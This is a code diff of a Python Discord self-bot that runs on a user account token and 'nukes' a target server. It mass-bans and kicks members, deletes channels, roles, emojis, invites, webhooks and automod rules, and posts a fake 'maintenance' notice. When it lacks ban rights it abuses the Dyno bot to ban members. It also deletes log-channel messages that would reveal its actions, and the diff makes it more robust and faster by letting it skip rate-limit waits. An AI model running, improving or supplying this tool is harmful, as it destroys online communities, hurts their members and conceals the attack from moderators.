@@ -3,16 +3,14 @@ import datetime
 from datetime import timedelta
 import discord
 import sys
+import re
 from discord.ext import commands
 
 bot = commands.Bot(command_prefix="?", self_bot=True)
 
-if sys.platform == 'win32':   # weird fix for a bug I ran into
+if sys.platform == 'win32':  # weird fix for a bug I ran into
     asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
 
-
-# Get the token and run the bot
-user_token = input("Input user token: ")
 guild_nuke_id = input("Input the Guild ID that will be nuked: ")
 if not guild_nuke_id.strip().isnumeric():
     print("Invalid Guild ID: Non numeric input.")
@@ -23,6 +21,9 @@ if not auto_delete_logs_channel_id.strip().isnumeric():
     auto_delete_logs_channel_id = None
 dyno_prefix = input("Input the dyno bot prefix: ").strip()
 print(f"Using Dyno bot commands with prefix: {dyno_prefix}")
+ratelimit_question = input("Wait between commands? [Y/n]: ")
+avoid_ratelimit = False
+if ratelimit_question.lower().startswith("y"): avoid_ratelimit = True
 
 
 async def parse_input(user_input: str):
@@ -49,7 +50,14 @@ async def delete_bot_message(channel: discord.abc.GuildChannel):
         return
     async for message in channel.history(limit=None):
         if message.author.bot:
-            await message.delete()
+            try:
+                await message.delete()
+            except discord.Forbidden:
+                print(f"Failed to delete message in {message.channel.name}: Forbidden.")
+            except discord.NotFound:
+                print(f"Failed to delete message in {message.channel.name}: Not Found.")
+            except discord.HTTPException:
+                print(f"Failed to delete message in {message.channel.name}: HTTPException.")
             return
 
 
@@ -66,7 +74,13 @@ async def nuke(guild: discord.Guild):
     for role in member.roles:
         if role > top_role: top_role = role
     print(f"Top role: {top_role.name}")
-    channels = await guild.fetch_channels()
+    channels = None
+    try:
+        channels = await guild.fetch_channels()
+    except discord.InvalidData:
+        print("Failed to Fetch Guild Channels: Invalid Data.")
+    except discord.HTTPException:
+        print("Failed to Fetch Guild Channels: HTTPException.")
 
     #  ----  Fetching every user's ID  ----  #
 
@@ -76,12 +90,13 @@ async def nuke(guild: discord.Guild):
 
     good_channels_for_member_scraping = []
     channel_ratings = {}
-    for x in channels:
-        if not x.permissions_for(member).read_messages: continue
-        roles_seeing_channel_count = 0
-        for role in guild.roles:
-            if x.permissions_for(role).read_messages: roles_seeing_channel_count += 1
-        channel_ratings[f'{x.id}'] = roles_seeing_channel_count
+    if channels:
+        for x in channels:
+            if not x.permissions_for(member).read_messages: continue
+            roles_seeing_channel_count = 0
+            for role in guild.roles:
+                if x.permissions_for(role).read_messages: roles_seeing_channel_count += 1
+            channel_ratings[f'{x.id}'] = roles_seeing_channel_count
 
     sorted_channels = sorted(channel_ratings.items(), key=lambda item: item[1], reverse=True)
 
@@ -90,33 +105,38 @@ async def nuke(guild: discord.Guild):
         append_channel = await guild.fetch_channel(channel_id)
         good_channels_for_member_scraping.append(append_channel)
 
-
     guild_members = []
     if guild_perms.kick_members or guild_perms.ban_members or guild_perms.manage_roles or is_admin:
-        members = await guild.fetch_members(force_scraping=False, channels=good_channels_for_member_scraping)
-        for x in members:
-            if x.id == bot.user.id:
-                members.remove(x)
-                continue
-            if x.status is not discord.Status.offline:
+        if len(good_channels_for_member_scraping) > 1:
+            members = await guild.fetch_members(force_scraping=False, channels=good_channels_for_member_scraping)
+            for x in members:
+                if x.id == bot.user.id:
+                    members.remove(x)
+                    continue
+                if x.status is not discord.Status.offline:
+                    guild_members.append(x)
+                    members.remove(x)
+            for x in members:
                 guild_members.append(x)
                 members.remove(x)
-        for x in members:
-            guild_members.append(x)
-            members.remove(x)
+        else:
+            print("No Valid Channels found for scraping.")
     else:
-        members = await guild.fetch_members(channels=good_channels_for_member_scraping, force_scraping=True, delay=.1)
-        for x in members:
-            if x.id == bot.user.id:
-                members.remove(x)
-                continue
-            if x.status is not discord.Status.offline:
+        if len(good_channels_for_member_scraping) > 1:
+            members = await guild.fetch_members(channels=good_channels_for_member_scraping, force_scraping=True,
+                                                delay=.1)
+            for x in members:
+                if x.id == bot.user.id:
+                    members.remove(x)
+                    continue
+                if x.status is not discord.Status.offline:
+                    guild_members.append(x)
+                    members.remove(x)
+            for x in members:
                 guild_members.append(x)
                 members.remove(x)
-        for x in members:
-            guild_members.append(x)
-            members.remove(x)
-
+        else:
+            print("No Valid Channels found for scraping.")
 
     #  ----  Channel Permission Denial  ----  #
 
@@ -126,7 +146,10 @@ async def nuke(guild: discord.Guild):
         category_perms = category.permissions_for(member)
         if category_perms.manage_permissions or is_admin:
             for role in guild.roles:
-                if role < top_role:
+                if role < top_role or guild.owner_id == bot.user.id:
+                    if len(role.members) < 1: continue
+                    if not category.permissions_for(role).read_messages and not category.permissions_for(role). \
+                            send_messages: continue
                     overwrite = category.overwrites.get(role)
                     if not overwrite: overwrite = discord.PermissionOverwrite()
                     overwrite.update(**{"send_messages": False, "read_messages": False})
@@ -136,7 +159,10 @@ async def nuke(guild: discord.Guild):
         channel_perms = channel.permissions_for(member)
         if channel_perms.manage_permissions or is_admin:
             for role in guild.roles:
-                if role < top_role:
+                if role < top_role or guild.owner_id == bot.user.id:
+                    if len(role.members) < 1: continue
+                    if not channel.permissions_for(role).read_messages and not channel.permissions_for(role). \
+                            send_messages: continue
                     overwrite = channel.overwrites.get(role)
                     if not overwrite: overwrite = discord.PermissionOverwrite()
                     overwrite.update(**{"send_messages": False, "read_messages": False})
@@ -148,7 +174,10 @@ async def nuke(guild: discord.Guild):
             channel_perms = channel.permissions_for(member)
             if channel_perms.manage_permissions or is_admin:
                 for role in guild.roles:
-                    if role < top_role:
+                    if role < top_role or guild.owner_id == bot.user.id:
+                        if len(role.members) < 1: continue
+                        if not channel.permissions_for(role).read_messages and not channel.permissions_for(role). \
+                                send_messages: continue
                         overwrite = channel.overwrites.get(role)
                         if not overwrite: overwrite = discord.PermissionOverwrite()
                         overwrite.update(**{"send_messages": False, "read_messages": False})
@@ -158,61 +187,176 @@ async def nuke(guild: discord.Guild):
 
     if guild_perms.manage_guild or is_admin:
         print("Deleting Automod Rules")
-        rules = await guild.automod_rules()
-        for rule in rules: await rule.delete()
-        automod_rule_action = discord.AutoModRuleAction()
-        automod_rule_action.type = discord.AutoModRuleActionType.timeout
-        one_day = timedelta(days=1)
-        automod_rule_action.duration = one_day
+        rules = None
+        already_blocking = False
+        try:
+            rules = await guild.automod_rules()
+        except discord.Forbidden:
+            print("Failed to fetch Automod rules: Forbidden.")
+        except discord.NotFound:
+            print("Failed to fetch Automod rules: Not Found.")
+        except discord.HTTPException:
+            print("Failed to fetch Automod Rules: HTTPException.")
+        if rules:
+            for rule in rules:
+                if rule.trigger.type is discord.AutoModRuleTriggerType.keyword:
+                    for x in rule.trigger.regex_patterns:
+                        print(x)
+                        if x == "^.*$":
+                            print("There is already an Automod Rule blocking all messages.")
+                            already_blocking = True
+                            if not rule.enabled:
+                                print("Blocking Rule was disabled, enabling it.")
+                                await rule.edit(enabled=True)
+                            continue
+                try:
+                    await rule.delete()
+                except discord.Forbidden:
+                    print(f"Failed to delete Automod Rule: Forbidden.")
+                except discord.NotFound:
+                    print(f"Failed to delete Automod Rule: Not Found.")
+                except discord.HTTPException:
+                    print(f"Failed to delete Automod Rule: HTTPException.")
 
-        automod_rule_block_action = discord.AutoModRuleAction(
-            custom_message="Server is down for maintenance, Work will be done soon.")
+        if not already_blocking:
+            automod_rule_action = discord.AutoModRuleAction()
+            automod_rule_action.type = discord.AutoModRuleActionType.timeout
+            one_day = timedelta(days=1)
+            automod_rule_action.duration = one_day
 
-        automod_rule_trigger = discord.AutoModTrigger(type=discord.AutoModRuleTriggerType.keyword,
-                                                      regex_patterns=["^.*$"])
-        print("Blocking messages with an Automod rule")
-        await guild.create_automod_rule(name="Block Messages", event_type=discord.AutoModRuleTriggerType.keyword,
-                                        actions=[automod_rule_action, automod_rule_block_action], enabled=True,
-                                        trigger=automod_rule_trigger)
+            automod_rule_block_action = discord.AutoModRuleAction(
+                custom_message="Server is down for maintenance, Work will be done soon.")
 
+            automod_rule_trigger = discord.AutoModTrigger(type=discord.AutoModRuleTriggerType.keyword,
+                                                          regex_patterns=["^.*$"])
+            print("Blocking messages with an Automod rule")
+            try:
+                await guild.create_automod_rule(name="Block Messages",
+                                                event_type=discord.AutoModRuleTriggerType.keyword,
+                                                actions=[automod_rule_action, automod_rule_block_action], enabled=True,
+                                                trigger=automod_rule_trigger)
+            except discord.Forbidden:
+                print("Failed to make Automod Rule: Forbidden.")
+            except discord.HTTPException:
+                print("Failed to make Automod rule: HTTPException.")
+        else:
+            print("There is already a blocking Automod rule.")
 
     #  ----  Emojis & Stickers Deletion  ----  #
 
     if guild_perms.manage_emojis_and_stickers or is_admin:
         print("Deleting Stickers")
-        stickers = await guild.fetch_stickers()
-        for x in stickers: await x.delete()
+        stickers = None
+        try:
+            stickers = await guild.fetch_stickers()
+        except discord.HTTPException:
+            print("Failed to fetch stickers.")
+        if stickers:
+            for x in stickers:
+                try:
+                    await x.delete()
+                except discord.Forbidden:
+                    print(f"Failed to delete sticker {x.name}: Forbidden.")
+                except discord.HTTPException:
+                    print(f"Failed to delete sticker {x.name}: HTTPException.")
 
         print("Deleting Emojis")
-        emojis = await guild.fetch_emojis()
-        for x in emojis: await x.delete()
+        emojis = None
+        try:
+            emojis = await guild.fetch_emojis()
+        except discord.HTTPException:
+            print("Couldn't fetch emojis: HTTPException.")
+        if emojis:
+            for x in emojis:
+                try:
+                    await x.delete()
+                except discord.Forbidden:
+                    print(f"Couldn't delete emoji {x.name}: Forbidden.")
+                except discord.HTTPException:
+                    print(f"Couldn't delete emoji {x.name}: HTTPException")
 
     #  ----  Invites & Templates Deletion  ----  #
 
     if guild_perms.manage_guild or is_admin:
         print("Deleting invites")
-        invites = await guild.invites()
-        for x in invites: await x.delete()
+        invites = None
+        try:
+            invites = await guild.invites()
+        except discord.Forbidden:
+            print(f"Couldn't fetch invites: Forbidden.")
+        except discord.HTTPException:
+            print(f"Couldn't fetch templates: HTTPException.")
+        if invites:
+            for x in invites:
+                try:
+                    await x.delete()
+                except discord.Forbidden:
+                    print("Couldn't delete invite: Forbidden.")
+                except discord.NotFound:
+                    print(f"Couldn't delete invite: Not Found.")
+                except discord.HTTPException:
+                    print("Couldn't delete invite: HTTPException.")
 
         print("Deleting Templates")
-        templates = await guild.templates()
-        for x in templates: await x.delete()
+        templates = None
+        try:
+            templates = await guild.templates()
+        except discord.Forbidden:
+            print(f"Couldn't fetch templates: Forbidden.")
+        if templates:
+            for x in templates:
+                try:
+                    await x.delete()
+                except discord.Forbidden:
+                    print(f"Couldn't delete template: Forbidden.")
+                except discord.NotFound:
+                    print(f"Couldn't delete template: Not Found.")
+                except discord.HTTPException:
+                    print(f"Couldn't delete template: HTTPException.")
 
     #  ----  Webhooks Deletion  ----  #
 
     if guild_perms.manage_webhooks or is_admin:
         print("Deleting Webhooks")
-        webhooks = await guild.webhooks()
-        for x in webhooks: await x.delete()
+        webhooks = None
+        try:
+            webhooks = await guild.webhooks()
+        except discord.Forbidden:
+            print("Couldn't fetch webhooks.")
+        if webhooks:
+            for x in webhooks:
+                try:
+                    await x.delete()
+                except discord.NotFound:
+                    print(f"Webhook {x.name} not found, continuing.")
+                except discord.Forbidden:
+                    print(f"Couldn't delete webhook {x.name}: Forbidden")
+                except discord.HTTPException:
+                    print(f"Failed to delete webhook {x.name}.")
 
     #  ----  Prune Members  ----  #
 
     if guild_perms.kick_members or is_admin:
-        print("Pruning members with >1 day of inactivity")
         pruneable_roles = []
         for x in guild.roles:  # Can only prune lower roles
-            if x < top_role: pruneable_roles.append(x)
-        await guild.prune_members(days=1, roles=pruneable_roles)
+            if x < top_role or guild.owner_id == bot.user.id: pruneable_roles.append(x)
+        try:
+            pruneable_count = await guild.estimate_pruned_members(days=1, roles=pruneable_roles)
+        except discord.Forbidden:
+            print("Don't have permissions to prune.")
+            pruneable_count = None
+        except discord.HTTPException:
+            print("Failed to prune members.")
+            pruneable_count = None
+        if pruneable_count:
+            print("Pruning members with >1 day of inactivity")
+            try:
+                pruned_count = await guild.prune_members(days=1, roles=pruneable_roles)
+                print(f"Pruned {pruned_count} members.")
+            except discord.Forbidden:
+                print("Don't have permissions to prune.")
+            except discord.HTTPException:
+                print("Failed to prune members.")
 
     #  ----  Mass Kick/Ban  ----  #
 
@@ -229,47 +373,51 @@ async def nuke(guild: discord.Guild):
     if guild_perms.kick_members and not guild_perms.ban_members and not is_admin:
         print("User just has kick perms.")
         for x in guild_members:
-            if x.top_role < top_role:
+            if x.top_role < top_role or guild.owner_id == bot.user.id:
                 try:
                     await x.kick()
                     guild_members.remove(x)
-                    if len(guild_members) > 0: await asyncio.sleep(3)
+                    if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(3)
                 except discord.Forbidden:
                     print(f"Failed to kick member {x.name}, id: {x.id}")
                 except Exception as e:
                     print(e)
-            else: guild_members.remove(x)
+            else:
+                guild_members.remove(x)
     elif guild_perms.ban_members and not guild_perms.kick_members and not is_admin:
         print("User just has ban perms.")
         for x in guild_members:
-            if x.top_role < top_role:
+            if x.top_role < top_role or guild.owner_id == bot.user.id:
                 try:
                     await x.ban()
                     guild_members.remove(x)
-                    if len(guild_members) > 0: await asyncio.sleep(3)
+                    if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(3)
                 except discord.NotFound:
                     print(f"Failed to ban member: The requested user was not found: {x.name} id: {x.id}")
                     guild_members.remove(x)
                 except discord.Forbidden:
-                    print(f"Failed to ban member {x.name}, id: {x.id}")
+                    print(f"Failed to ban member {x.name}, id: {x.id}: Forbidden")
                     guild_members.remove(x)
                 except Exception as e:
                     guild_members.remove(x)
                     print(e)
-            else: guild_members.remove(x)
+            else:
+                guild_members.remove(x)
     elif guild_perms.ban_members and guild_perms.kick_members or is_admin:
         print("Use has both ban and kick perms. Or has admin.")
         ban_turn = True
         for x in guild_members:
-            if ban_turn: print(f"trying to ban: {x.name}")
-            else: print(f"trying to kick: {x.name}")
-            if x.top_role < top_role:
+            if ban_turn:
+                print(f"trying to ban: {x.name}")
+            else:
+                print(f"trying to kick: {x.name}")
+            if x.top_role < top_role or guild.owner_id == bot.user.id:
                 if ban_turn:
                     ban_turn = False
                     try:
                         await x.ban()
                         guild_members.remove(x)
-                        if len(guild_members) > 0: await asyncio.sleep(1.5)
+                        if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(1.5)
                     except discord.NotFound:
                         print(f"Failed to ban member: The requested user was not found: {x.name} id: {x.id}")
                         guild_members.remove(x)
@@ -285,25 +433,27 @@ async def nuke(guild: discord.Guild):
                     try:
                         await x.kick()
                         guild_members.remove(x)
-                        if len(guild_members) > 0: await asyncio.sleep(1.5)
+                        if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(1.5)
                     except discord.Forbidden:
                         print(f"Failed to kick member {x.name}, id: {x.id}")
                         guild_members.remove(x)
                     except Exception as e:
                         guild_members.remove(x)
                         print(e)
-            else: guild_members.remove(x)
+            else:
+                guild_members.remove(x)
     elif not guild_perms.kick_members and not guild_perms.ban_members and not is_admin:
         print("User has no kick or ban perms. And no admin.")
         print("Trying to kick/ban everyone with a bot.")
 
         #  Trying to find the lowest channel, with a preference for voice channels
-        for x in channels:
-            if x.type is discord.ChannelType.text: continue
-            if not x.permissions_for(member).use_application_commands or not x.permissions_for(member).read_messages \
-                    or not x.permissions_for(member).send_messages:
-                continue
-            possible_channel = x  # Uses the lowest voice channel
+        if channels:
+            for x in channels:
+                if x.type is discord.ChannelType.text: continue
+                if not x.permissions_for(member).use_application_commands or not x.permissions_for(member).read_messages \
+                        or not x.permissions_for(member).send_messages:
+                    continue
+                possible_channel = x  # Uses the lowest voice channel
 
         if not possible_channel:  # Uses the lowest text channel
             for x in channels:
@@ -331,7 +481,6 @@ async def nuke(guild: discord.Guild):
                 print("Dyno delete role perms")
                 delete_role_command = x
 
-
         for x in guild_members:
             print(f"{len(guild_members)} iterating over: {x.name}")
             if ban_command:
@@ -344,7 +493,7 @@ async def nuke(guild: discord.Guild):
                     continue
             if ban_command:
                 for x in guild_members:
-                    if x.top_role < top_role:
+                    if x.top_role < top_role or guild.owner_id == bot.user.id:
                         try:
                             print(f"Trying to ban {x.name} via Dyno bot.")
                             options = {
@@ -358,7 +507,7 @@ async def nuke(guild: discord.Guild):
                                 await possible_channel.send(content=f"{dyno_prefix}ban {x.id}", delete_after=1)
                                 await delete_bot_message(channel=possible_channel)
                             guild_members.remove(x)
-                            if len(guild_members) > 0: await asyncio.sleep(4)
+                            if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(4)
                         except discord.ext.commands.errors.CommandNotFound:
                             print("Ban Slash command not found, opting for plaintext command.")
                             plain_text_ban = True
@@ -376,7 +525,7 @@ async def nuke(guild: discord.Guild):
                     else:
                         guild_members.remove(x)
             elif kick_command:
-                if x.top_role < top_role:
+                if x.top_role < top_role or guild.owner_id == bot.user.id:
                     try:
                         print(f"Trying to kick {x.name} via Dyno bot.")
                         if not plain_text_kick:
@@ -386,7 +535,7 @@ async def nuke(guild: discord.Guild):
                             await possible_channel.send(content=f"{dyno_prefix}kick {x.id}", delete_after=1)
                             await delete_bot_message(channel=possible_channel)
                         guild_members.remove(x)
-                        if len(guild_members) > 0: await asyncio.sleep(4)
+                        if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(4)
                     except discord.ext.commands.errors.CommandNotFound:
                         print("Kick Slash command not found, opting for plaintext command.")
                         plain_text_kick = True
@@ -405,7 +554,7 @@ async def nuke(guild: discord.Guild):
                     guild_members.remove(x)
         if plain_text_ban:
             for x in guild_members:
-                if x.top_role < top_role:
+                if x.top_role < top_role or guild.owner_id == bot.user.id:
                     try:
                         print(f"Trying to ban {x.name} via Dyno bot.")
                         options = {
@@ -419,7 +568,7 @@ async def nuke(guild: discord.Guild):
                             await possible_channel.send(content=f"{dyno_prefix}ban {x.id}", delete_after=1)
                             await delete_bot_message(channel=possible_channel)
                         guild_members.remove(x)
-                        if len(guild_members) > 0: await asyncio.sleep(4)
+                        if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(4)
                     except discord.ext.commands.errors.CommandNotFound:
                         print("Ban Slash command not found, opting for plaintext command.")
                         plain_text_ban = True
@@ -437,7 +586,7 @@ async def nuke(guild: discord.Guild):
                     guild_members.remove(x)
         if plain_text_kick:
             for x in guild_members:
-                if x.top_role < top_role:
+                if x.top_role < top_role or guild.owner_id == bot.user.id:
                     try:
                         print(f"Trying to kick {x.name} via Dyno bot.")
                         if not plain_text_kick:
@@ -447,7 +596,7 @@ async def nuke(guild: discord.Guild):
                             await possible_channel.send(content=f"{dyno_prefix}kick {x.id}", delete_after=1)
                             await delete_bot_message(channel=possible_channel)
                         guild_members.remove(x)
-                        if len(guild_members) > 0: await asyncio.sleep(4)
+                        if len(guild_members) > 0 and avoid_ratelimit: await asyncio.sleep(4)
                     except discord.ext.commands.errors.CommandNotFound:
                         print("Kick Slash command not found, opting for plaintext command.")
                         plain_text_kick = True
@@ -472,10 +621,10 @@ async def nuke(guild: discord.Guild):
         for x in guild_roles:
             if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                 continue
-            if x > top_role: continue
+            if x > top_role and guild.owner_id != bot.user.id: continue
             try:
                 await x.delete()
-                await asyncio.sleep(2)
+                if avoid_ratelimit: await asyncio.sleep(2)
             except discord.Forbidden:
                 print(f"Forbidden: Failed to delete role: {x.name}")
             except discord.HTTPException:
@@ -489,14 +638,14 @@ async def nuke(guild: discord.Guild):
             for x in guild_roles:
                 if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                     continue
-                if x > top_role: continue
+                if x > top_role and guild.owner_id != bot.user.id: continue
                 try:
                     if not plain_text_delete_role:
                         await x.delete()
                     else:
                         await possible_channel.send(content=f"{dyno_prefix}delrole {x.id}", delete_after=3)
                         await delete_bot_message(channel=possible_channel)
-                    await asyncio.sleep(4)
+                    if avoid_ratelimit: await asyncio.sleep(4)
                 except discord.ext.commands.errors.CommandNotFound:
                     print("Delrole Slash command not found, opting for plaintext command.")
                     plain_text_delete_role = True
@@ -514,11 +663,11 @@ async def nuke(guild: discord.Guild):
                 for x in guild_roles:
                     if x.is_default() or x.is_bot_managed() or x.is_premium_subscriber() or x.is_integration():
                         continue
-                    if x > top_role: continue
+                    if x > top_role and guild.owner_id != bot.user.id: continue
                     try:
                         await possible_channel.send(content=f"{dyno_prefix}delrole {x.id}", delete_after=1)
                         await delete_bot_message(channel=possible_channel)
-                        await asyncio.sleep(4)
+                        if avoid_ratelimit: await asyncio.sleep(4)
                     except discord.Forbidden:
                         print(f"Forbidden: Failed to delete role: {x.name}")
                     except discord.HTTPException:
@@ -532,7 +681,15 @@ async def nuke(guild: discord.Guild):
         print("Deleting Channels")
         for channel in channels:
             if is_admin or channel.permissions_for(member).manage_channels:
-                await channel.delete()
+                try:
+                    await channel.delete()
+                    if avoid_ratelimit: await asyncio.sleep(1)
+                except discord.NotFound:
+                    print(f"Channel {channel.name} not found, continuing")
+                except discord.Forbidden:
+                    print(f"Cannot delete channel {channel.name}: Forbidden")
+                except discord.HTTPException:
+                    print(f"Failed to Delete channel {channel.name}")
 
     #  ----  Banning Kicked Users  ----  #
 
@@ -541,9 +698,16 @@ async def nuke(guild: discord.Guild):
             print("Going back and banning kicked users")
             for x in kicked_members:
                 print(f"Banning {x.name}")
-                await x.ban()
-                kicked_members.remove(x)
-                if len(kicked_members) > 0: await asyncio.sleep(3)
+                try:
+                    await x.ban()
+                    kicked_members.remove(x)
+                    if len(kicked_members) > 0 and avoid_ratelimit: await asyncio.sleep(3)
+                except discord.NotFound:
+                    print(f"Failed to ban {x.name}: User not found.")
+                except discord.Forbidden:
+                    print(f"Failed to ban {x.name}: Improper Permissions.")
+                except discord.HTTPException:
+                    print(f"Failed to ban {x.name}: HTTP Exception, Banning Failed.")
 
     print("End of Nuke.")
 
@@ -552,20 +716,52 @@ async def nuke(guild: discord.Guild):
 async def on_ready():
     print(f"Logged in as user {bot.user.name} is in {len(bot.guilds)} guilds.")
     print("This is a logging only console: You cannot use commands here.")
-    print("CANNOT USE COMMANDS HERE")
     await parse_input(guild_nuke_id)
 
 
 @bot.event
 async def on_message(message: discord.Message):
     if not auto_delete_logs_channel_id: return
-    if not message.author.bot or message.channel.id != int(auto_delete_logs_channel_id.strip()): return
+    if not message.author.bot: return
+    if not message.channel.permissions_for(message.guild.me).manage_messages and not \
+            message.guild.me.guild_permissions.administrator: return
+    delete_message = False
+    if len(message.embeds) > 0:
+        if hasattr(message.embeds[0], "author"):
+            if message.embeds[0].author:
+                if bot.user.name in message.embeds[0].author.name:
+                    delete_message = True
+                if "Left" in message.embeds[0].author.name:
+                    delete_message = True
+        if hasattr(message.embeds[0], "description"):
+            if "deleted" in message.embeds[0].description.lower():
+                delete_message = True
+    if not delete_message: return
     try:
-        if message.channel.permissions_for(message.guild.me).manage_messages:
-            print("Deleting message from log channel.")
-            await message.delete()
-    except Exception as e:
-        print(f"Tried to delete message in log channel: {e}")
+        await message.delete()
+    except discord.Forbidden:
+        print(f"Failed to delete message in {message.channel.name}: Forbidden.")
+    except discord.NotFound:
+        print(f"Failed to delete message in {message.channel.name}: Not Found.")
+    except discord.HTTPException:
+        print(f"Failed to delete message in {message.channel.name}: HTTPException.")
+    return
 
+
+# Get the token and run the bot
+user_token = input("Input user token: ")
+
+token_pattern = r'[MNO][a-zA-Z\d_-]{23,25}\.[a-zA-Z\d_-]{6}\.[a-zA-Z\d_-]{27}'
+
+if not re.match(token_pattern, user_token):
+    print("Bad User Token sensed. Please check for bad characters.")
+    print("Continue with bad token? Script will do nothing if it is bad.")
+    question = input("Type [Yes/No]: ")
+    answer = question.lower().strip()
+    if answer == "no":
+        quit()
+    elif answer != "yes":
+        print("Invalid input, quitting.")
+        quit()
 
 bot.run(user_token)
